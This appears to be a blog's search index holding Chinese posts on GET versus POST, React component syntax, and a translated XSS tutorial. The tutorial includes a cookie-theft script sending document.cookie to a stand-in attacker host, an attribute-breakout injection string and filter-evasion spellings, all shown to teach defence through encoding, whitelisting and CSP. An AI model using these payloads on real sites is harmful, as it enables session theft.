<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[GET和POST区别]]></title>
      <url>http://yoursite.com/2017/05/31/GET%E5%92%8CPOST%E5%8C%BA%E5%88%AB/</url>
      <content type="text"><![CDATA[前言之前很长时间我都在想这个问题，总感觉网上的答案有问题，并非我想要的，但是又搞不清楚问题在哪里！一天我跑去问立峰（rd大神），他反问我，我支支吾吾说了一些： GET在浏览器回退时是无害的，而POST会再次提交请求。 GET产生的URL地址可以被Bookmark，而POST不可以。 GET请求会被浏览器主动cache，而POST不会，除非手动设置。 GET请求只能进行url编码，而POST支持多种编码方式。 GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。 GET请求在URL中传送的参数是有长度限制的，而POST么有。 对参数的数据类型，GET只接受ASCII字符，而POST没有限制。 GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。 GET参数通过URL传递，POST放在Request body中。 好吧，其实就是网上千变一律的答案，虽然我感觉有哪里不对，但是我不知道问题所在，还是随大流！然后他说面试时回答这个问题可以体现一个人的水平层次，然后他说了一下他的答案，不过当时没听懂！最近发现两篇文章，说的很清晰，让我恍然大悟！ 网上的答案网上的答案无非主要是三点：get请求数据放在url中并且url有长度限制，post请求数据放在body中，所以导致后者比前者安全。 那么网上的答案从何而来呢？在HTML标准中找到了相似的描述，这是HTML标准对HTTP用法的约定，所以不能说网上的答案是完全错误的，只能说是片面的。XMLHttpRequest对象就是这样，get请求参数放在url中，post请求放在body中。 url长度限制这个限制并非是HTTP协议对GET和POST做的长度限制，限制url长度的是浏览器和服务器 浏览器对url的长度要求是2k到90k吧，不同浏览器限制不一样 服务器。URL长了，对服务器处理也是一种负担。原本一个会话就没有多少数据，现在如果有人恶意地构造几个几M大小的URL，并不停地访问你的服务器。服务器的最大并发数显然会下降。另一种攻击方式是，把告诉服务器Content-Length是一个很大的数，然后只给服务器发一点儿数据，嘿嘿，服务器你就傻等着去吧。哪怕你有超时设置，这种故意的次次访问超时也能让服务器吃不了兜着走。有鉴于此，多数服务器出于安全啦、稳定啦方面的考虑，会给URL长度加限制。 安全人们常说post比get安全，好吧，我只能安不安全是相对的！ 实际上的答案get和post都是HTTP协议规定的请求方法，HTTP的底层是TCP/IP，所以GET和POST的底层也是TCP/IP，也就是说，GET/POST都是TCP链接，本质上无差别。GET和POST能做的事情是一样一样的。你要给GET加上request body，给POST带上url参数，技术上是完全行的通的，主要传输方和接收方支持！ 既然能做的事都可以一样，那么为什么HTTP要划分不同的方法呢？试想如果没有这些方法的标记，所有的请求看起来都是一毛一样，是不是一团混乱！比如酒店会把顾客划分为VIP，会员和普通用户，虽然都是人，可是享受的服务不一样！所以HTTP是一种行为准则，需要浏览器和服务器自觉遵守。 GET和POST有一个重大区别：GET产生一个TCP数据包;POST产生两个TCP数据包。 对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200(返回数据); 对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok(返回数据)。 因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑!跳入需谨慎。为什么? GET与POST都有自己的语义，不能随便混用。 据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。 并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。 引用 GET和POST有什么区别？及为什么网上的多数答案都是错的。 99%的人都理解错了HTTP中GET与POST的区别]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[React组件写法]]></title>
      <url>http://yoursite.com/2017/05/31/React%E7%BB%84%E4%BB%B6%E5%86%99%E6%B3%95/</url>
      <content type="text"><![CDATA[简介用ES5(createClass)或ES6都可以完美地写React组件，本文总结两者写法的区别！ 区别 //ES5(createClass)var InputControlES5 = React.createClass(&#123; propTypes: &#123; initialValue: React.PropTypes.string &#125;, getDefaultProps()&#123; return&#123; initialValue: '' &#125; &#125;, // 设置 initial state getInitialState: function() &#123; return &#123; text: this.props.initialValue || 'placeholder' &#125;; &#125;, handleChange: function(event) &#123; this.setState(&#123; text: event.target.value &#125;); &#125;, render: function() &#123; return ( &lt;div&gt; Type something: &lt;input onChange=&#123;this.handleChange&#125; value=&#123;this.state.text&#125; /&gt; &lt;/div&gt; ); &#125;&#125;);//ES6class InputControlES6 extends React.Component &#123; constructor(props) &#123; super(props); // 设置 initial state this.state = &#123; text: props.initialValue || 'placeholder' &#125;; // ES6 类中函数必须手动绑定 this.handleChange = this.handleChange.bind(this); &#125; handleChange(event) &#123; this.setState(&#123; text: event.target.value &#125;); &#125; render() &#123; return ( &lt;div&gt; Type something: &lt;input onChange=&#123;this.handleChange&#125; value=&#123;this.state.text&#125; /&gt; &lt;/div&gt; ); &#125;&#125;InputControlES6.propTypes = &#123; initialValue: React.PropTypes.string&#125;;InputControlES6.defaultProps = &#123; initialValue: ''&#125;; 函数绑定 用createClass每一个成员函数都由React自动绑定，函数中的this变量在函数调用时会被正确设置。 用ES6函数不是自动绑定的，必须手动绑定。最好是在构造函数中做这事，就像上面的例子那样。 Initial State设置 createClass方法接受一个getInitialState函数作为参数一部分，这个函数会在组件挂载时被调用一次。 ES6使用构造函数，在调用super之后，直接设置state即可。 defaultProps设置 createClass方法接受一个getDefaultProps函数作为参数一部分，这个函数会在组件挂载时被调用一次。 ES6在构造函数上加defaultProps属性，还有另外一种写法如下。 class Person extends React.Component &#123; static defaultProps = &#123; name: '', age: -1 &#125; &#125; propTypes设置 createClass方法接受一个propTypes作为参数一部分。 ES6在构造函数上加propTypes属性，还有另外一种写法如下。 class Person extends React.Component &#123; static propTypes = &#123; name: React.PropTypes.string, age: React.PropTypes.string &#125; &#125; 目前PropTypes已在react新版中剥离出来，在开发中引入prop-types模块代替！ 第三选项除了createClass和class外，React还支持所谓的「无状态(stateless)函数组件」。本质上它就是一个函数，没有state，并且不能使用任何诸如componentWillMount或shouldComponentUpdate的生命周期方法。对于接受某些props并直接基于这些props渲染的简单组件来说，无状态函数组件非常合适。下面是一个例子：function Person(props) &#123; const &#123;firstName,lastName&#125; = props; return ( &lt;span&gt;&#123;lastName&#125;, &#123;firstName&#125;&lt;/span&gt; );&#125; mixins因为在createClass中，mixins有些特殊的规则，目前还没找到好的替代方法！ 总结Facebook已经声明createClass最终会被ES6 class取代，不过他们也说「我们不会废弃createClass直到我们找到目前 mixin用例的替代方案，并且在语言中支持类属性初始化器」。只要有可能，尽量使用无状态函数组件。他们很简单，也会迫使你保持 UI组件简单。对于需要state、生命周期方法、或（通过refs）访问底层DOM节点的复杂组件，使用class。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[了解XSS]]></title>
      <url>http://yoursite.com/2017/05/04/XSS/</url>
      <content type="text"><![CDATA[前言知乎上的一篇XSS介绍，是百度大神李翌所注，写的浅显易懂，而且很全面！我想我很难总结出这么好的文章，那就直接拿来吧！ 什么是XSS跨站点脚本（Cross-site scripting，XSS）是一种允许攻击者在另一个用户的浏览器中执行恶意脚本的脚本注入式攻击。攻击者并不直接锁定受害者。而是利用一个受害者可能会访问的存在漏洞的网站，通过这个网站间接把恶意代码呈递给受害者。对于受害者的浏览器而言，这些恶意代码看上去就是网站正常的一部分，而网站也就无意中成了攻击者的帮凶。 什么是恶意脚本首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意，Javascript的执行环境受到严格限制并只有非常有限的权限访问用户的文件和操作系统。事实上，你现在就可以打开你浏览器的脚本控制台立刻执行任何你想执行的脚本，几乎不可能对你的电脑造成任何的伤害。 然而当你了解了以下几个事实之后脚本变得恶意的可能性就越来越明显了： Javascript有权访问一些用户的敏感信息，比如cookie Javascript能够通过XMLHttpRequest或者其他一些机制发送带有任何内容的HTTP请求到任何地址。 Javascript能够通过DOM操作方法对当前页面的HTML做任意修改。这些相关联的情况会引起非常严重的安全问题，这也是我们接下来要解释的。 恶意脚本的后果这种在其他用户的浏览器中执行任意脚本的权限，赋予了攻击者有能力发动以下几类攻击 Cookie窃取：攻击者能够通过document.cookie访问受害者与网站关联的cookie，然后传送到攻击者自己的服务器，接着从这些cookie中提取敏感信息，如Session ID。 记录用户行为（Keylogging）：攻击者可以使用 addEventListener方法注册用于监听键盘事件的回调函数，并且把所有用户的敲击行为发送到他自己的服务器，这些敲击行为可能记录着用户的敏感信息，比如密码和信用卡号码。 钓鱼网站（Phishing）：攻击者可以通过修改DOM在页面上插入一个假的登陆框，也可以把表单的action属性指向他自己的服务器地址，然后欺骗用户提交自己的敏感信息。 尽管这些攻击类型大不相同，但都有一条重要的相似之处：因为攻击者把代码注入进的页面是由网站的，所以恶意脚本都是在网站的上下文环境中执行，这就意味着恶意代码被当作网站提供的其他正常脚本一样对待：它有权访问受害者与网站关联的数据（比如cookie），可此时浏览器地址栏的的主机名（hostname）仍然是原网站的。总而言之，恶意脚本被浏览器认为是网站合法的一部分，允许它做任何事情。 这些事实都在强调一个关键性问题： 如果攻击者能够借助你的网站在另一个用户的浏览器中执行任意脚本，那么你网站的安全性已经无从谈起了。 为了能够直奔重点，本篇教程中的一些例子都略去了恶意脚本的具体代码细节，只显示&lt;script&gt;...&lt;/script&gt;。这表示这段代码是攻击者注入的代码，不会再深究代码具体的执行内容是什么。 XSS攻击中的各种角色在我们具体解释XSS攻击是如何运作之前，我们需要定义一下XSS攻击涉及的角色。总的来说，XSS攻击涉及三类角色：网站、受害者、和攻击者 网站响应用户发出的请求并返回网页。在我们后面的例子中，网站的地址是http://webiste/ 网站数据库用于存储显示在页面上的的用户输入的内容。 受害者是一位从浏览器向网站请求页面的普通用户 攻击者是一位打算利用网站XSS漏洞向受害者发动攻击的恶意用户 攻击者服务器是由攻击者控制服务器，专用于窃取受害者的敏感信息。在我们的例子中，它的地址是：http://attacker 一个攻击场景示例在这个例子中，我们假设攻击者的终极目标是利用网站的XSS漏洞窃取受害者的cookie。这可以通过设法让受害者的浏览器解析下面HTML代码来实现：&lt;script&gt;window.location='http://attacker/?cookie='+document.cookie&lt;/script&gt; 这段脚本将用户的浏览器定向到一个完全不同的URL，也就是触发向攻击者的服务器发送一次HTTP请求。这串URL把受害者的cookie作为查询参数，当攻击者服务器收到该请求后就能从中把cookie提取出来。一旦攻击者获取到cookie，他就能借助cookie扮演受害者并且发动更多的攻击。 从现在起，上面的HTML就被认为是恶意文本或者是恶意脚本。非常值得注意的重要一点是，恶意代码只有在受害者的浏览器中最终得到解析之后才算得上是恶意，这只可能发生有XSS缺陷的站点上。 攻击是如何工作的下面的图示展现了上面的例子中攻击者发动的攻击是如何运作的1、攻击者利用提交网站表单将一段恶意文本插入网站的数据库中2、受害者向网站请求页面3、网站从数据库中取出恶意文本把它包含进返回给受害者的页面中4、受害者的浏览器执行返回页面中的恶意脚本，把自己的cookie发送给攻击者的服务器。 XSS攻击类型虽然XSS攻击的终极目标是在受害者的浏览器中执行恶意脚本，但是实现这个目标的不同途径还是有根本上的差别的。XSS攻击常常被划分为三类： 持续型XSS攻击：恶意文本来源于网站的数据库 反射型XSS攻击：恶意文本来源于受害者的请求 基于DOM的XSS攻击：利用客户端而不是服务端代码漏洞发动攻击上一个例子演示了一次持续型XSS攻击，接下来我们描述其他两类XSS攻击：反射型XSS和基于DOM的XSS。 反射型XSS攻击在一个反射型XSS攻击中，恶意文本属于受害者发送给网站的请求中的一部分。随后网站又把恶意文本包含进用于响应用户的返回页面中，发还给用户。下面的图示说明了这个场景 攻击者构造了一个包含恶意文本的URL发送给受害者 受害者被攻击者欺骗，通过访问这个URL向网站发出请求 网站给受害者的返回中包含了来自URL的的恶意文本 受害者的浏览器执行了来自返回中的恶意脚本，把受害者的cookie发送给攻击者的服务器 反射型XSS攻击是如何成功的？首先如此看来，反射型XSS攻击似乎无法造成任何危害，因为它要求受害者亲自发出一次带有恶意文本的请求。因为没有人会攻击自己，所以这样以来这样的攻击也就没法被执行。 但事实上是，至少存在两种方式使得一位受害者向他自己发动反射型XSS攻击： 如果攻击者的目标是一位具体的个人用户，攻击者可以把恶意链接发送给受害者（比如通过电子邮件或者短信），并且欺骗他去访问这个链接。 如果攻击者的目标是一个群体，攻击者能够发布一条指向恶意URL的链接（比如在他的个人网站或者社交网络上），然后等待访问者去点击它。 这两种方式非常相似，并且以URL短链服务做配合成功的概率会更高，因为短链服务能够把恶意文本隐藏起来使得用户没法辨别出它。 基于DOM的XSS攻击基于DOM的XSS是属于持久型和反射型XSS的变种。在基于DOM的XSS的攻击中，除非网站自身的合法脚本被执行，否则恶意文本不会被受害者的浏览器解析。下面的图示展示了基于反射X型SS攻击的这样一个场景 攻击者构造一个包含恶意文本的URL发送受害者 受害者被攻击者欺骗，通过访问这个URL向网站发出请求 网站收到请求，但是恶意文本并没有包含在给受害者的返回页面中 受害者的浏览器执行来自网站返回页面里的合法脚本，导致恶意脚本被插入进页面中 受害者的浏览器执行插入进页面的恶意脚本，把自己的cookie发送到攻击者的服务器 什么使得基于DOM的XSS如此不同在之前关于持久型和反射型的XSS攻击中，服务器将恶意脚本插入进页面中并返回给受害者。当受害者的浏览器收到返回后，它以为恶意脚本也是页面合法内容的一部分，并在页面加载时和其他脚本一同自动执行。 但是在这个基于DOM的XSS攻击示例中，页面中本不包含恶意脚本，在页面加载时自动执行的仅仅是页面里的合法脚本。问题在于合法脚本直接把用户的输入作为HTML新增于页面中。因为恶意文本是借助于innerHTML方法插入进页面中，它也被当作HTML来解析，所以导致恶意脚本被执行。 两者虽然稍有不同，但这细微的差异非常重要： 在传统的XSS攻击中，恶意脚本作为服务器传回的一部分，在页面加载时就被执行 在基于DOM的XSS攻击中，恶意脚本在页面加载之后的某个时间点才执行，是合法脚本以非安全的方式处理用户输入的结果。 为什么基于DOM的XSS值得留意在之前的例子中，Javscript是非必须的；服务器能够自己生成HTML。如果服务端代码没有漏洞，网站也就不会被XSS攻击。 但是随着网络应用变得越来越先进，HTML由客户端Javascript生成的情况也越来越多。任何时候想在不刷新页面的情况下改变页面内容，这样的更新操作必须由Javascript来完成。最值得注意的是，这也是AJAX请求之后更新页面的常规步骤。 这意味着XSS漏洞不仅存在于你的网站服务端代码中，还存在于网站客户端Javascript代码中。后果就是，即使你拥有绝对安全的服务端代码，但只要存在把用户输入放入DOM更新中的情况，那么你的客户端代码仍然是不安全的。如果这样的情况发生了，那么表示客户端代码在没有服务端代码过错的情况下仍导致了一次XSS攻击。 基于DOM的XSS攻击对服务端不可见有一种基于DOM的XSS攻击的特殊情况是，恶意文本从一开始就不会被传送至服务端：当恶意文本包含在URL的片段标识符（#后之后的任意文本）中。浏览器不会将这部分的URL发送给服务端，所以网站也无法从服务端代码中知晓。但无论如何，恶意代码始终会经过客户端，如果处理不够安全的话会引起XSS漏洞。 这样的情况不限于片段标识符。其他的对服务端不可见的用户输入包括新的HTML5特性比如LocalStorage和IndexedDB都有这样的隐患。 阻止XSS攻击的方式 编码，也就是转义用户的输入，这样浏览器就会把它解读为数据而不是代码 校验，也就是对用户的输入进行过滤，这样浏览器仍然把它解读为代码但当中已不存在恶意指令了 虽然它们是阻止XSS攻击最基本的两类不同方式，但是在使用他们时有一些共同的特性需要着重理解： 上下文（Context）：验证输入会随着用户输入插入页码的位置而有所不同 到达/离开（Inbound/outbound）：验证输入既可以发生在网站接收到输入的时候（到达），也可以刚好发生在网站打算把输入插入到页面之前（离开） 客户端/服务端：验证输入既可以在客户端执行，也可以在服务端执行。在不同的场景下两者都能派上用场。在我们继续解释编码和校验如何工作的细节之前，我们需要详细讲解一下这些要点。 处理输入的上下文页面中有许多用户输入可以插入的地方都存在上下文。对于这样的每一处，都必须建立特殊的规则以确保用户输入不会破坏上下文并且不被解读为恶意代码。下面是一些最常见的上下文： 为什么上下文重要在所有描述的上下文中，XSS漏洞有可能在用户的输入在没有经过校验或者编码就插入页面的情况下产生。攻击者只要简单的在上下文中插入闭合分隔符和恶意代码，就完成了一次恶意脚本注入。 举个例子，如果在某种情况下网站会把用户输入直接插入进HTML元素的属性中，攻击者就会以双引号符号开头插入一段恶意脚本，像下面这样：&lt;table&gt; &lt;tr&gt; &lt;td&gt;Application code&lt;/td&gt; &lt;td&gt;&amp;#60;input value="&lt;strong&gt;userInput&lt;/strong&gt;"&amp;#62;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Malicious string&lt;/td&gt; &lt;td style="color:hsl(0, 100%, 50%)"&gt;"&amp;#62;&amp;#60;script&amp;#62;...&amp;#60;&amp;#47;script&amp;#62;&amp;#60;input value="&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Resulting code&lt;/td&gt; &lt;td&gt;&amp;#60;input value="&lt;strong style="color:hsl(0, 100%, 50%)"&gt;"&amp;#62;&amp;#60;script&amp;#62;...&amp;#60;&amp;#47;script&amp;#62;&amp;#60;input value="&lt;/strong&gt;"&amp;#62;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; 可以通过将用户输入中的所有双引号符号移除来防止这样的情况发生，然后就天下太平了——但这只是在当前的上下文中。如果同样的用户输入插入进另一个上下文中，闭合分隔符又会变成其他符号，代码注入又会死灰复燃。出于这样的原因，验证输入要依据用户输入插入的地方而有所区分。 到达/离开的输入处理我们本能的以为，当网站收到用户的输入时立即做编码或者校验就能够避免XSS攻击。通过这个方式，所有恶意文本在被包含进页面时就已经失效了，并且用于产生HTML的脚本再不用担心处理输入的安全性问题了。 但问题是，如之前描述的那样，用户输入可能被插入进页面的好几个上下文中。也没有容易的办法确定用户的输入最终插入的上下文是哪一个，甚至同一段用户的输入需要被插入不同的上下文中。所以依赖到达式的输入处理方式来阻止XSS是一个可能会导致错误的不那么健壮的解决方案。（PHP中已经被移除的一个特性“magic quotes”就是这个解决方案的一个例子） 相反，离开时对输入进行处理应该是你对付XSS攻击的主要阵地。因为它把用户输入可能会插入的地方也考虑到了。话虽如此，到达时的校验仍然可以作为第二道防线，接下来我们会详细描述。 在什么地方验证输入在大多数现代的web应用中，用户输入同时要经过服务端代码和客户端代码处理。为了抵御所有类型的XSS攻击，验证输入必须同时在客户端和服务端执行。 为了抵御传统的XSS攻击，验证输入必须在服务端得到执行，服务端支持的任何编程语言都能做到 为了抵御服务器无法触及恶意文本情况下的基于DOM的XSS攻击（比如之前描述的片段标识符攻击），验证输入在客户端也必须被执行。这是通过Javascript完成的。现在我们已经解释了为什么上下文重要，以及到达和离开时输入验证的重要性，还有为什么输入验证必须同时经过客户端和服务端代码的验证，我们要继续解释两类验证输入（编码和校验）是如何运作的。 编码编码是一种将用户输入转义的行为，以确保浏览器把输入当作数据而不是代码对待。在web开发中最知名的一类编码莫过于HTML转义，该方法将&lt;和&gt;分别转义为&amp;lt;和&amp;gt;。 下面的伪代码示范了用户的输入是如何利用HTML转义进行编码，并通过一段服务器脚本插入进页面中的：print "&lt;html&gt;"print "Latest comment: "print encodeHtml(userInput)print "&lt;/html&gt;" 如果用户输入的是是字符串&lt;script&gt;...&lt;/script&gt;，那么最终的HTML会是下面这个样子：&lt;html&gt;Latest comment:&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;&lt;/html&gt; 因为所有拥有特殊意义的字符已经被转义了，浏览器就不会把任何的用户输入解析为HTML了。 同时用服务端和客户端代码进行编码当在客户端实现编码时，使用的编程语言只能是Javascript，它自带为不同上下文编码的内建方法。 当在服务端实现编码时，你依赖的是服务端的编程语言或者框架自带的方法。鉴于有非常多的语言和框架可用，这篇教程不会涵盖与任何具体语言或者框架相关的编码细节。但无论如何，了解客户端Javascript编码函数的使用对编写服务端代码也是非常有帮助的。 在客户端进行编码当在客户端使用Javascript对用户输入进行编码时，有一些内置的方法和属性能够在自动感知上下文的情况下自动对所有的数据进行编码：&lt;table&gt; &lt;thead&gt; &lt;th&gt;Context&lt;/th&gt; &lt;th&gt;Method/property&lt;/th&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt;HTML element content&lt;/td&gt; &lt;td&gt;node.textContent = &lt;strong&gt;userInput&lt;/strong&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;HTML attribute value&lt;/td&gt; &lt;td&gt;&lt;em&gt;element&lt;/em&gt;.setAttribute(&lt;em&gt;attribute&lt;/em&gt;, &lt;strong&gt;userInput&lt;/strong&gt;)&lt;br&gt;or&lt;br&gt;&lt;em&gt;element&lt;/em&gt;[attribute] = &lt;strong&gt;userInput&lt;/strong&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;URL query value&lt;/td&gt; &lt;td&gt;window.encodeURIComponent(&lt;strong&gt;userInput&lt;/strong&gt;)&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;CSS value&lt;/td&gt; &lt;td&gt;&lt;em&gt;element&lt;/em&gt;.style.&lt;em&gt;property&lt;/em&gt;= &lt;strong&gt;userInput&lt;/strong&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt; 之前提到的最后一类上下文（JavaScript values）并不在这个列表之中，因为Javascript源码中并不提供内置的数据编码方法。 编码的局限性即使有编码的辅助，恶意文本仍然可能插入进一些上下文中。一个著名的例子就是用户通过输入来提供URL时，比如下面这个例子：document.querySelector('a').href = **userInput** 虽然给一个锚点元素的href属性赋值时该值会被自动的编码，最终也不过是一个属性值而已，这并不能阻止攻击者以javascript:开头插入一段URL。当该链接被点击后，URL中的任何脚本都会被执行。 在你真心希望用户可以自定义页面的代码的情况下，对输入进行编码也不是一个好的解决方案。一个典型的例子就是当用户可以使用HTML自定义个人主页时。如果自定义的HTML全都被编码了，那么个人主页只剩下一堆纯文本而已。 在这些情况中，校验措施就被补充进来，也就是我们接下来要描述的内容。 校验校验是一种过滤用户输入以至于让代码中恶意部分被移除的行为。在web开发中最知名的校验是允许HTML元素（比如&lt;em&gt;和&lt;strong&gt;）的存在而拒绝其他内容（比如&lt;script&gt;）。 不同的校验实践主要有两点特征上的区别： 分类策略：用户输入既可以用黑名单过滤也可以用白名单过滤 校验结果：被认定为恶意的用户输入可以既可以被拒绝使用也可以在规范化之后继续使用 黑名单制我们会自然的认为，通过建立一套禁止用户做出某些输入的模式，来实现校验是非常合理的。如果文本匹配中这个模式，则被认定为无效。其中一个例子就是允许用户提交除javascript:以外任何协议的自定义URL。这样的分类策略被称为黑名单。 但是黑名单有两个主要的缺陷： 复杂性：准确的描述出所有恶意文本的集合通常是一件非常复杂的任务。上面例子中描述的策略，仅仅通过搜索子字符串”javascript”是不可能成功的，因为这样会导致错过Javascript:（首字母大写）和&amp;#106;avascript:（首字母被编码为字符值引用）形式的字符串。 过时：即使一个健全的黑名单被开发出来，但如果某个使得恶意文本有可乘之机的新特性被添加进浏览器，校验仍然会失败。举个例子，在HTML5的onmousewheel特性引入之前制作出的黑名单，阻止不了攻击者使用该属性进行XSS攻击。这个缺陷在web开发中显得尤其重要，因为开发中的许多技术都是在不断更新中的。 因为这些缺陷，分类策略中的黑名单制并不鼓励使用。白名单制通常要安全许多，我们接下来继续讲解。 白名单制白名单机制与黑名单相反：与定义一个禁止输入模式不同，白名单方式定义了一个允许输入的模式，如果用户输入与该模式不匹配则该输入视为无效。 与之前黑名单的例子相反，一个白名单的例子会是只允许用户提交包含http:与https:协议的自定义URL。这种方式会将包含javascript协议的URL视为无效，甚至出现Javascript或者&amp;#106;avascript:也被视为无效。 和黑名单相比，白名单有两点主要的好处： 简单：准确的列举出一组安全文本总的来说会比辨别出一组恶意文本来的简单。尤其是在用户输入只涵盖有限的浏览器功能子集的大多数情况下。举个例子，上面描述的只允许以http:或者https:协议开头的URL的白名单就非常的简单，并且完美适配大多数的用户场景。 长效：与黑名单不同，当浏览器加入新的特性时白名单的内容也不会变得过时。比如当HTML5的onmousewheel属性被引入时，只允许HTML元素上存在title属性的白名单校验规则仍然有效。 校验输出结果当输入被标记为无效时，以下两个行动的其中之一会被执行： 拒绝：输入会被简单的拒绝，以防止被用在网站的其他地方 规范化：输入中所有不规范的部分会被移除，剩下的继续在网站正常使用 这两个方案中，拒绝是最容易实施的方案。但话虽如此，规范化却用处更大，因为它允许用户输入的范围更大。举个例子，如果一位用户提交了信息用卡卡号，规范化流程会移除非数字的字符以防止代码注入，这样也允许了用户提交时无论是否包含连字符都亦可。 如果你决定实现规范化方案，你必须保证规范化流程使用的不是黑名单策略。比如有一个这样的URL：Javascript:...，即使当它被白名单判定无效时，规范化流程也会通过简单的把所有的javascript:移除来使它重新通过校验。出于这个原因，经过良好测试的类库和框架在条件允许的情况下都会使用规范化做校验。 使用哪一种防治策略编码应该是你防御XSS攻击的首选，因为它非常适用于净化数据使之不被作为代码被编译。像前面有些例子中解释的一样，编码需要以校验作为补充。编码和校验应该设立在离开阶段，因为只有当输入包含进页面中时你才知道为哪一类上下文进行编码和校验。 作为防御的第二道防线，你应该使用进站校验对明显无效的数据规范化或者拒之门外，比如使用javascript:协议的超链接。虽然它不能被证明是完全安全有效的，但是当编码和校验因为一些错误没有被很好执行时，这仍然是个不错的预防措施。 如果这两道防线一直在投入使用，那么你的网站能够很好的远离XSS攻击。但是鉴于创建和维护一个网站的复杂性，仅仅采取验证输入的方式来实现全方位的保护还是比较困难的。作为第三道防线，你应该利用起CSP（Content Security Policy），也就是我们接下来要讲解的内容 Content Security Policy (CSP)只使用验证输入来防止XSS攻击的劣势在于即使存在一丝的漏洞也会使得你的网站遭到攻击。最近的一个被称为Content Security Policy（CSP）的标准能够减少这个风险。 CSP对你用于浏览页面的浏览器做出了限制，以确保它只能从可信赖来源下载的资源。资源可以是脚本，样式，图片，或者其他被页面引用的文件。这意味着即使攻击者成功的在你的网站中注入了恶意内容，CSP也能免于它被执行。 CSP遵循下列规则 不许允不可信赖的来源：只有来自明确定义过的可信赖来源的外链资源才可以被下载 不允许内联资源：行内脚本和内联CSS不允许被执行。 不允许eval函数：Javascript的eval函数不可以被使用 CSP实战在下面的例子中，一个攻击者成功在一个页面中注入了恶意代码： &lt;html&gt;Latest comment:http://attacker/malicious-script.js&lt;/a&gt;"&gt;&lt;/html&gt; 在恰当配置CSP的情况下，浏览器不会加载和执行malicious-script.js，因为http://attacker域名不在可信赖的来源集合中。即使在这个例子中网站没能成功的验证输入的安全性，CSP策略也能防止来自因为漏洞引起的损害。 退一步说纵然攻击者注入了行内脚本代码而不是外链一个文件，恰当的CSP策略也能拒绝行内脚本的执行来防止因为漏洞引起的损害。 如何启用CSP默认情况下浏览器并不强制启用CSP。如果需要在你的网站上启用CSP，页面必须在服务器返回时添加额外的HTTP头：Content-Security-Policy。任何拥有这个返回头的页面即表示它有自己的安全策略，浏览需要特别对待，也即告诉浏览器请支持CSP。 因为安全策略是附属于每一个HTTP返回中，所以对服务器来说可以逐个页面的设置安全策略。通过在每一个返回中添加统一的CSP头来使得整个站点都可以采取同一个策略。 Content-Security-Policy的值是定义了单个或多个能影响你站点安全策略的字符串。字符串的语法会在接下来的内容进行描述。 注意：这一节中为了更清晰的展现，例子中的头(header)在书写时我们使用换行和缩进，在实际的头中请勿这么书写 CSP头的语法如下： Content-Security-Policy: directive source-expression, source-expression, ...; directive ...; ... 语法由两部分元素组成： 指令：从一个预设的清单中选取资源类型的名称 来源表达式：描述一个或多个能够下载资源的服务器 对于每一个指令来说，来源表达式定义了哪些来源可以用来下载不同类型的资源。 指令CSP头能够使用的指定如下： connect-src font-src frame-src img-src media-src object-src script-src style-src除此之外，特别的指令default-src用于为所有指令提供一个没有包含在头中的默认值。 来源表达式来源表达式的语法如下：protocol://host-name:port-number 主机名称（host name）可以以*开头，也就是说任意提供的主机名称下的子域名都是允许的。相似的端口号也能是*，也就意味着所有的端口号都有效。另外，协议和端口号也可以忽略不填。最后，协议可以自己定义，这使得使用HTTPS协议加载所有资源也可能。 作为上述语法的补充，来源表达式还能够额外选自有特殊意义的四个关键字之一（包括引号） ‘none’: 不允许任何资源 ‘self’: 只允许来自提供页面服务主机(host)的资源 ‘unsafe-inline’: 允许页面内嵌的所有资源，比如行内&lt;script&gt;元素，&lt;style&gt;元素，和javascript:开头的URL ‘unsafe-eval’: 允许使用Javascript的eval函数值得注意的是无论CSP何时被使用，行内资源和eval函数默认都是不允许自动执行的。使用unsafe-inline和unsafe-eval是唯一启用使用他们的方式。 一个策略实例Content-Security-Policy: script-src 'self' scripts.example.com; media-src 'none'; img-src *; default-src 'self' http://*.example.com 在这个策略例子中，页面受制于以下的限制： 脚本只允许下载自提供页面的主机和http://scripts.example.com 不允许任何音频和视频下载 图片可以从任何地方下载 所有的其他资源只允许下载自提供页面的主机和http://example.com的任何子域名 CSP目前的状态截至2013年六月，Content Security Policy还只是W3C候选推荐标准。它由不同的浏览器厂商自行实现，其中有些特性仍然只有部分浏览器上有效。还好能够利用HTTP头用于区分浏览器。在今天使用CSP之前，请先查阅你打算支持的浏览器的相关文档。 引用 【译文】了解XSS攻击]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[cookies,sessionStorage和localStorage]]></title>
      <url>http://yoursite.com/2017/04/20/cookies-sessionStorage%E5%92%8ClocalStorage/</url>
